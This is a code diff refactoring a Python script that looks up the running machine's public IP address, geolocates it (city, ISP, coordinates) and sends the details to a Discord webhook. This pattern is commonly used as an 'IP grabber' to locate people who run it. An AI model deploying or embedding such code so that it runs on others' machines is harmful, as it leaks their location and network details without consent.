@@ -3,34 +3,37 @@
 #pip install datetime
 
 import requests
-import json
 from dhooks import Webhook, Embed
 from datetime import datetime
 
-hook = Webhook("webhook here")
+hook = Webhook("WEBHOOK_URL_HERE")
 
-time = datetime.now().strftime("%H:%M %p")  
-ip = requests.get("https://api.ipify.org/").text
+time = datetime.now().strftime("%I:%M %p")
+ip = requests.get("https://api.ipify.org").text
 
-r = requests.get(f'http://extreme-ip-lookup.com/json/{ip}')
-geo = r.json()
-embed = Embed()
-fields = [
-    {'name': 'IP', 'value': ['query']},
-    {'name': 'ipType', 'value': ['ipType']},
-    {'name': 'Country', 'value': ['country']},
-    {'name': 'City', 'value': ['city']},
-    {'name': 'Continent', 'value': ['continent']},
-    {'name': 'Country', 'value': ['country']},
-    {'name': 'IPName', 'value': ['ipName']},
-    {'name': 'ISP', 'value': ['isp']},
-    {'name': 'Latitute', 'value': ['lat']},
-    {'name': 'Longitude', 'value': ['lon']},
-    {'name': 'Org', 'value': ['org']},
-    {'name': 'Region', 'value': ['region']},
-    {'name': 'Status', 'value': ['status']},
-]
-for field in fields:
-    if field['value']:
-        embed.add_field(name=field['name'], value=field['value'], inline=True)
+geo = requests.get(f"http://extreme-ip-lookup.com/json/{ip}").json()
+
+embed = Embed(
+    title="IP Lookup",
+    description=f"Lookup performed at **{time}**",
+    color=0x5865F2
+)
+
+def add(name, key):
+    value = geo.get(key, "N/A")
+    embed.add_field(name=name, value=value, inline=True)
+
+add("IP", "query")
+add("IP Type", "ipType")
+add("Country", "country")
+add("City", "city")
+add("Region", "region")
+add("Continent", "continent")
+add("ISP", "isp")
+add("Organization", "org")
+add("Latitude", "lat")
+add("Longitude", "lon")
+add("IP Name", "ipName")
+add("Status", "status")
+
 hook.send(embed=embed)
